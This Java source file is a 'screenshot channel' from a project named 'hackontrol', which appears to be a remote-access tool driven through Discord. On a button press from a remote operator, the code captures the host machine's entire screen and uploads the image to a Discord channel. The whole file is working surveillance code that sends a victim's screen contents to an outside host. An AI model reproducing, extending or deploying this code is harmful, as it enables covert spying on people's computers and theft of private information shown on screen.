package com.khopan.hackontrol.channel;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.Calendar;

import javax.imageio.ImageIO;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolButton;
import com.khopan.hackontrol.utils.HackontrolError;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.utils.FileUpload;

public class ScreenshotChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "screenshot";

	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", "screenshot");

	private Robot robot;

	@Override
	public String getName() {
		return ScreenshotChannel.CHANNEL_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.BUTTON_SCREENSHOT, this :: buttonScreenshot);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ScreenshotChannel.BUTTON_SCREENSHOT)).queue();
	}

	private void buttonScreenshot(ButtonContext context) {
		try {
			if(this.robot == null) {
				this.robot = new Robot();
			}

			BufferedImage image = this.robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			ByteArrayOutputStream stream = new ByteArrayOutputStream();
			ImageIO.write(image, "png", stream);
			context.replyFiles(FileUpload.fromData(stream.toByteArray(), ScreenshotChannel.getScreenshotFileName())).addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
		} catch(Throwable Errors) {
			HackontrolError.throwable(context.reply(), Errors);
			return;
		}
	}

	private static String getScreenshotFileName() {
		try {
			Calendar calendar = Calendar.getInstance();
			return String.format("screenshot-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png", calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH) + 1, calendar.get(Calendar.DAY_OF_MONTH), calendar.get(Calendar.HOUR_OF_DAY), calendar.get(Calendar.MINUTE), calendar.get(Calendar.SECOND), calendar.get(Calendar.MILLISECOND));
		} catch(Throwable Errors) {
			return "screenshot.png";
		}
	}
}
